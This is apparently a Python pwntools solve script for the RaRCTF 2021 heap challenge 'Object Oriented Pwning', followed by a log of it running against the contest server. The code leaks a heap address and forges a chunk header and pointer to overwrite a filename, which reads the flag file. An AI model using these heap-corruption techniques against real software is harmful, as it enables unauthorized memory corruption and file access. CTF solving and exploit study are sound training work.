from pwn import *

#context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './oop'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "193.57.159.27"
  PORT = 25295
  s = remote(HOST, PORT)
else:
  s = process(BINARY)
  libc = elf.libc

def List():
  s.sendlineafter("> ", "1")

def Act(idx, act, name):
  s.sendlineafter("> ", "2")
  s.sendlineafter("animal? ", str(idx))
  s.sendlineafter("> ", str(act))
  if act == 3:
    s.sendlineafter("animal? ", name)

def Buy(pig_or_cow, name):
  s.sendlineafter("> ", "3")
  s.sendlineafter("> ", str(pig_or_cow))
  s.sendlineafter("animal? ", name)

def Buy_translator():
  s.sendlineafter("> ", "4")

for i in range(3):
  Buy(1, "A"*8)

for i in range(3):
  Act(i, 1, "")

for i in range(4):
  Buy(1, "A"*8)

for i in range(4):
  Act(i, 1, "")

for i in range(5):
  Buy(1, chr(ord("a")+i)*8)

# heap leak
Act(4, 1, "")
Act(3, 1, "")
Act(2, 3, "X"*0x24)
List()
s.recvuntil("X"*0x24)
r = s.recvuntil(" ")[:-1]
heap_leak = u64(r.ljust(8, "\x00"))
heap_base = heap_leak - 0x12f80
print "heap_leak =", hex(heap_leak)
print "heap_base =", hex(heap_base)

Act(2, 3, "X"*0x1c+p64(0x41)+p64(heap_base + 0x12e58))

for i in range(4):
  Buy(1, chr(ord("a")+i)*8)

# change pig.txt => flag.txt
Buy(1, "X"*0x4+p64(0x41)+p64(0x404d78)+"flag")

Buy_translator()
Act(2, 4, "")
Act(1, 4, "")

s.interactive()

'''
mito@ubuntu:~/CTF/RaRCTF_2021/Pwn_Object_Oriented_Pwning_600/OOP$ python solve.py r
[*] '/home/mito/CTF/RaRCTF_2021/Pwn_Object_Oriented_Pwning_600/OOP/oop'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to 193.57.159.27 on port 25295: Done
heap_leak = 0x69cf80
heap_base = 0x68a000
[*] Switching to interactive mode
 __________
< Feed me! >
 ----------
  \
    \
rarctf{C0w_s4y_m00_p1g_s4y_01nk_fl4g_s4y-251e363a}
Unknown option
'''
